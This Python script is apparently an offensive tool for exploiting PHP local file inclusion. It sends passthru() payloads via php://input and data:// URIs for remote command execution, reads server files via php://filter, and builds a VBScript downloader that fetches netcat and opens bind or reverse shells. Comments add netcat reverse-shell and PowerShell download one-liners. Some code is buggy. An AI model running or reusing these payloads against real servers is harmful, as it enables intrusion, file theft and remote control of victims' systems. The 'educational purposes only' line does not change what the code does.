from __future__ import print_function
from bs4 import BeautifulSoup
import requests
import urllib2
import urllib
import base64
import sys
import os
import re

# A full LFi exploitation tool. You might have seen plenty of tools online but this is very unique. 
# Uses PHPInput, PHPFilter and DataURI methods
# My own logic and own code ;)

class lfi(object):
	def __init__(self, url=None, cookie=None, command=None, files=None):
		self._url = str(url)
		self._cookie = cookie
		self._command =  command
		self._files = files

	@property
	def url(self):
		return self._url
	
	@property
	def cookie(self):
		return self._cookie

	@property
	def command(self):
		return self._command	

	@property
	def files(self):
		return self._files

	@url.setter
	def url(self, url):
		self._url = url

	@cookie.setter
	def cookie(self, cookie):
		self._cookie = cookie

	@command.setter
	def command(self, command):
		self._command = command

	@files.setter
	def files(self, files):
		self._files = files
	
	@url.deleter
	def url(self):
		del self._url

	@cookie.deleter
	def cookie(self):
		del self._cookie   

	@command.deleter
	def command(self):
		del self._command 
	
	@files.deleter
	def files(self):
		del self._files 

	def test(self):
		vul = []
		self._command = 'echo CGQAwiEGmE'
		if self.phpInput() == ' \r\nCGQAwiEGmE\r\n': vul.append("PHP://input")
		if self.dataURI() == ' \r\nCGQAwiEGmE\r\n': vul.append("dataURI")
		print ('[*] Target is vulnerable to: \n')
		for i, j in enumerate(vul, start=1): print (i, j)
		choice = int(input("\nEnter a choice: "))
		command = str(input("Enter your command: ")) 
		if choice == 1: pass
		if choice == 2: pass
		if choice == 3: pass	
	
	def phpInput(self):
		mydata = "<?php passthru('echo CGQAtiDhmE &" + self._command + "& echo CGQAtiDhmE'); ?>"    #The first is the var name the second is the value
		path = self._url + 'php://input'    #the url you want to POST to
		req = urllib2.Request(path, mydata)
		req.add_header('User-Agent', 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.14) Gecko/20080404 Firefox/2.0.0.14')
		req.add_header("Content-type", "application/x-www-form-urlencoded")
		if self._cookie: req.add_header('Cookie',self._cookie)
		try: page = urllib2.urlopen(req)
		except urllib2.HTTPError as e: print ('Response code: '+e.code)
		html = BeautifulSoup(page.read(), 'lxml')
		match = re.search(r'CGQAtiDhmE(.+?)CGQAtiDhmE', html.text, flags=re.DOTALL)
		try: return (match.group(1))
		except: return ("[!] Error Occured")
		page.close()

	def phpFilter(self):
		path = self.self._url + 'php://filter/convert.base64-encode/resource=' + self._files   #the url you want to POST to
		req = urllib2.Request(path)
		req.add_header('User-Agent', 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.14) Gecko/20080404 Firefox/2.0.0.14')
		req.add_header("Content-type", "application/x-www-form-urlencoded")
		if self._cookie: req.add_header('Cookie',self._cookie)
		try: page = urllib2.urlopen(req)
		except urllib2.HTTPError as e: print ('Response code: '+e.code)
		html = BeautifulSoup(page.read(), 'lxml')
		match = re.search(r'(?:[A-Za-z0-9+/]{4}){2,}(?:[A-Za-z0-9+/]{2}[AEIMQUYcgkosw048]=|[A-Za-z0-9+/][AQgw]==)', html.text, flags=re.DOTALL).group()
		try: return str(match).decode('base64')
		except: return ("[!] Error Occured")
		page.close()

	def dataURI(self):
		payload = ("<?php passthru('echo CGQAtiDhmE &" + self._command + "& echo CGQAtiDhmE'); ?>").encode('base64').replace('\n','') 
		path = self._url + 'data://text/plain;base64,'+payload   #the url you want to POST to
		req = urllib2.Request(path)
		req.add_header('User-Agent', 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.14) Gecko/20080404 Firefox/2.0.0.14')
		req.add_header("Content-type", "application/x-www-form-urlencoded")
		if self._cookie: req.add_header('Cookie',self._cookie)
		try: page = urllib2.urlopen(req)
		except urllib2.HTTPError as e: print ('Response code: '+e.code)
		html = BeautifulSoup(page.read(), 'lxml')
		match = re.search(r'CGQAtiDhmE(.+?)CGQAtiDhmE', html.text, flags=re.DOTALL)
		try: return (match.group(1))
		except: return ("[!] Error Occured")
		page.close()

class Payload(object):
	def __init__(self, url=None, port=None, ip=None, shell=None):
		self._url = url
		self._port = port
		self._ip = ip
		self._shell = shell
		#self._location = location

	@property
	def url(self):
		return self._url
	
	@property
	def port(self):
		return self._port

	@property
	def ip(self):
		return self._ip

	@property
	def shell(self):
		return self._shell

	@url.setter
	def url(self, url):
		self._url = url

	@port.setter
	def port(self, port):
		self._port = port

	@ip.setter
	def ip(self, ip):
		self._ip = ip	

	@shell.setter
	def shell(self, shell):
		self._shell = shell	

	@url.deleter
	def url(self):
		del self._url

	@port.deleter
	def port(self):
		del self._port 

	@ip.deleter
	def ip(self):
		del self._ip 

	@shell.deleter
	def shell(self):
		del self._shell 

	def payload(self):
		nc=('nc.exe %s') %(self._ip) if self._shell=='reverse' else 'nc.exe -lvvp'
		payload =("echo strFileURL = \"{0}\" > down.vbs& \
			echo strHDLocation = \"nc.exe\" >> down.vbs& \
			echo Set objXMLHTTP = CreateObject(\"MSXML2.XMLHTTP\") >> down.vbs& \
			echo objXMLHTTP.open \"GET\", strFileURL, false >> down.vbs& \
			echo objXMLHTTP.send() >> down.vbs& \
			echo If objXMLHTTP.Status = 200 Then >> down.vbs& \
			echo Set objADOStream = CreateObject(\"ADODB.Stream\") >> down.vbs& \
			echo objADOStream.Open >> down.vbs& echo objADOStream.Type = 1 >> down.vbs& \
			echo objADOStream.Write objXMLHTTP.ResponseBody >> down.vbs& \
			echo objADOStream.Position = 0 >> down.vbs& \
			echo Set objFSO = Createobject(\"Scripting.FileSystemObject\") >> down.vbs& \
			echo If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation >> down.vbs& \
			echo Set objFSO = Nothing >> down.vbs& \
			echo objADOStream.SaveToFile strHDLocation >> down.vbs& \
			echo objADOStream.Close >> down.vbs& \
			echo Set objADOStream = Nothing >> down.vbs& \
			echo End if >> down.vbs& \
			echo Set objXMLHTTP = Nothing >> down.vbs& \
			echo Set objShell=CreateObject(\"WScript.Shell\") >> down.vbs& \
			echo objShell.Run \"{1} {2} -e \"\"cmd.exe\"\" \", 0, true >> down.vbs& \
			call down.vbs").format(
			self._url, 
			#self._location, 
			nc, 
			self._port
			)

		return payload

def shells(method, shell):
	shellObj = Payload()
	shellObj.shell = str(shell) # bind or reverse
	print('''
[*] Choose an OS 
1. Windows
2. Linux
''')
	choice = int(input('>> '))
	if method == 'phpInput':
		if choice == 1 and shell == 'bind':
			shellObj.url = str(input("[*] Enter the download URL of netcat: "))
			shellObj.port = str(input("[*] Enter the port to bind: "))
			print('[+] Connect on %s port %s') %(shellObj.ip, shellObj.port)
			payload = shellObj.payload()
			lfiObj.command = payload
			

#nc -lvvp 4444 -e "cmd.exe"
#nc.exe 192.168.1.5 4444 -e "cmd.exe"

def com(method):
	print ('''
[?] Choose an option:
1. Execute command
2. Bind Shell
3. Reverse Shell
''')
	choice = int(input(">> "))
	if choice == 1: lfiObj.command = str(input("[*] Enter your command: "))
	elif choice == 2: shells(method, 'bind')
	elif choice == 3: shells(method, 'reverse')


#powershell.exe -noprofile -noninteractive -command "[System.Net.ServicePointManager]::ServerCertificateValidationCallback= {$true}; $source="""http://192.168.1.5/nc.exe """; $destination= """C:\\nc.exe"""; $http = new-object System.Net.WebClient; $response= $http.DownloadFile($source, $destination);"
try: input = raw_input
except: pass

cls = lambda: os.system('cls') if os.name == 'nt' else os.system('clear')
lfiObj = lfi()

def banner():
	print('''

888     888~~  ,e,   
888     888___  "    
888     888    888   
888     888    888   
888     888    888   
888____ 888    888  

		888~~                             888   _   
		888___ 888-~\  e88~~8e    /~~~8e  888 e~ ~  
		888    888    d888  88b       88b 888d8b    
		888    888    8888__888  e88~-888 888Y88b   
		888    888    Y888    , C888  888 888 Y88b  
		888    888     "88___/   "88_-888 888  Y88b 

[*] Author: Osanda Malith Jayathissa
[*] E-Mail: osanda[cat]unseen.is
[*] Follow @OsandaMalith
[/!\] Use this for educational purposes only!
''')

def main():	
	cls()
	banner()
	try:
		lfiObj.url = str(input("[*] Enter the URL: "))
		cookie = str(input("[*] Enter the cookie values (press enter if none):\n"))
		if cookie == '': cookie = 0
		lfiObj.cookie = cookie
		while True:
			print ('''
[?] Choose an attacking method: 
1. Automated testing
2. PHP input method
3. PHP filter method
4. Data URI method
5. Exit
''')
			try: choice = int(input(">> "))
			except ValueError:
				print ("[!] Enter only a number")
				continue

			if choice == 1: lfiObj.test()
			elif choice == 2:
				com('phpInput')
				print (lfiObj.phpInput())

			elif choice == 3:
				files =  str(input("Enter the file path: "))
				print (lfiObj.phpFilter(files))
			
			elif choice == 4:
				com('dataURI')
				print (lfiObj.dataURI())
			
			elif choice == 5: return 0

			else:
				print ("[-] Invalid Choice")
		    	continue

	except KeyboardInterrupt:
		print ('[!] Ctrl + C detected\n[!] Exiting')
		sys.exit(0)
		
	except EOFError:
		print ('[!] Ctrl + D detected\n[!] Exiting')
		sys.exit(0)

if __name__ == "__main__": main()  
#EOF